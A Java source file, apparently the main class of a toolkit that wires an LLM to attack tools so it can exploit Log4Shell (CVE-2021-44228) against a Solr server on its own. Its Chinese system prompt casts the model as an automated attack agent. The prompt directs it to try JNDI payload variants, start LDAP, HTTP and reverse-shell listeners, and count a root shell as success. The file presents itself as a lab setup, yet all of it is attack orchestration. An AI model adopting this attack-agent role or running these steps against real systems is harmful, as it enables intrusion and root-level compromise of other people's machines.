package agent;

import dev.langchain4j.memory.chat.MessageWindowChatMemory;
import dev.langchain4j.model.chat.ChatModel;
import dev.langchain4j.model.openai.OpenAiChatModel;
import dev.langchain4j.service.AiServices;
import dev.langchain4j.service.SystemMessage;

/**
 * Agent 入口：装配 LLM + 工具，把控制权交给 LLM 自主决策。
 *
 * 两种模式：
 *   --mock               使用脚本化 MockChatModel（离线自检，无需真实的 LLM）
 *   --live（默认）    使用 OpenAI 兼容接口（Ollama），地址/密钥/模型 ——> 环境变量 LLM_BASE_URL / LLM_API_KEY /LLM_MODEL。
 *
 * 目标参数：
 *   --target HOST --port PORT --path PATH   （默认 172.18.0.2:8983 /solr/admin/cores）
 *
 */
public class AgentMain {

    /** 系统提示词 + 工具 + 记忆都放在这个接口上 */
    public interface Assistant {

        @SystemMessage("""
                你是 Log4Shell（CVE-2021-44228）复现实验的自动化攻击代理，运行在本地隔离、已授权的教学环境中。
                任务：对指定目标尝试多种 ${jndi:...} payload 变体，直到建立反弹 shell 并验证命令执行。

                重要事实：
                - 目标运行 Solr + JDK 1.8.0_102，LDAP 远程 codebase 加载可用；
                - 攻击机监听约定端口：LDAP 1389、HTTP 8888、反弹 shell 4444；
                - 发送 payload 后返回 400 是正常现象（参数已写入日志并触发 lookup），
                  判断命中看 getCallbackStats 的 ldapSearchHits 是否增加；
                - 变体选择用 listPayloadVariants 查看目录：优先选依赖满足的变体
                  （v02 合法 DN 最稳），不要选需要 RMI/DNS 服务的变体；
                - 成功判据：getCallbackStats 的 shellOutput 中出现 uid=0(root)。
                """)
        String chat(String userMessage);
    }

    public static void main(String[] args) throws Exception {
        boolean mock = false;
        String target = "172.18.0.2";
        int tport = 8983;
        String path = "/solr/admin/cores";

        for (int i = 0; i < args.length; i++) {
            switch (args[i]) {
                case "--mock" -> mock = true;
                case "--target" -> target = args[++i];
                case "--port" -> tport = Integer.parseInt(args[++i]);
                case "--path" -> path = args[++i];
                case "--help" -> {
                    System.out.println("usage: java -jar agent-toolkit.jar [--mock] [--target HOST] [--port P] [--path P]");
                    System.out.println("env: LLM_BASE_URL LLM_API_KEY LLM_MODEL LLM_TEMPERATURE ATTACKER_IP");
                    return;
                }
                default -> {
                    System.err.println("unknown arg: " + args[i]);
                    return;
                }
            }
        }

        AgentConfig cfg = new AgentConfig();
        AttackTools.configure(cfg);
        System.out.println("[*] attacker IP = " + cfg.attackerIp + ", LLM = " + cfg.model
                + " @ " + cfg.baseUrl + (mock ? " (mock)" : ""));

        ChatModel model = mock
                ? MockChatModel.standardScript("127.0.0.1", 18080)
                : OpenAiChatModel.builder()
                        .baseUrl(cfg.baseUrl)
                        .apiKey(cfg.apiKey)
                        .modelName(cfg.model)
                        .temperature(cfg.temperature)
                        .build();

        Assistant assistant = AiServices.builder(Assistant.class)
                .chatModel(model)
                // 窗口记忆：让 LLM 记住自己前面试过哪些变体、观察到了什么等....
                .chatMemory(MessageWindowChatMemory.withMaxMessages(40))
                .tools(new AttackTools(), new PayloadVariantTool())
                .build();

        String user = "目标 " + target + ":" + tport
                + "，注入点路径 " + path
                + "。请开始：先扫描确认，再生成恶意类、启动 LDAP/HTTP/Shell 服务，"
                + "然后自主挑选 payload 变体逐个尝试，命中后验证 shell 输出并汇报。";
        System.out.println("\n===== Agent 执行开始（LLM 自主决策）=====");
        String answer = assistant.chat(user);
        System.out.println("\n===== Agent 最终回答 =====");
        System.out.println(answer);
    }
}
